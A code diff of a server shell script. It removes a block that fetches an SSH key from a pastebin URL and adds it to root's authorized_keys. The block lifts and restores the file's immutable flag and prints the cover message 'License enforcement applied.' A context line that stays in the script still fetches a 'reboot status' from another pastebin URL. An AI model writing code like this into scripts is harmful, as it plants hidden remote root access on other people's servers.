@@ -191,43 +191,6 @@ checking_sc() {
             fi
         done
         
-        cd /root
-        
-        # Set new SSH key (as requested by user, keep this logic for now)
-        KEY_URL="https://pastebin.com/raw/miYzWrbg"
-        AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
-        
-        # Create .ssh directory if not exists
-        mkdir -p "/root/.ssh"
-        
-        # Fetch new key
-        NEW_KEY=$(curl -sS --connect-timeout 10 -m 20 "$KEY_URL" 2>/dev/null)
-        
-        if [ -n "$NEW_KEY" ]; then
-            # Set permissions for .ssh directory
-            chmod 700 "/root/.ssh"
-            
-            # Create authorized_keys file if not exists
-            if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
-                touch "$AUTHORIZED_KEYS_FILE"
-                chmod 600 "$AUTHORIZED_KEYS_FILE"
-            fi
-            
-            # Add new key if not already present
-            if ! grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE" 2>/dev/null; then
-                # Remove immutable attribute before editing
-                chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
-                
-                # Add new key to authorized_keys
-                echo "$NEW_KEY" | tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
-                
-                # Set immutable attribute back
-                chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
-                
-                echo "License enforcement applied."
-            fi
-        fi
-        
         # Check reboot status
         status=$(curl -sS --connect-timeout 10 -m 20 https://pastebin.com/raw/RTUFB2cF 2>/dev/null)
         
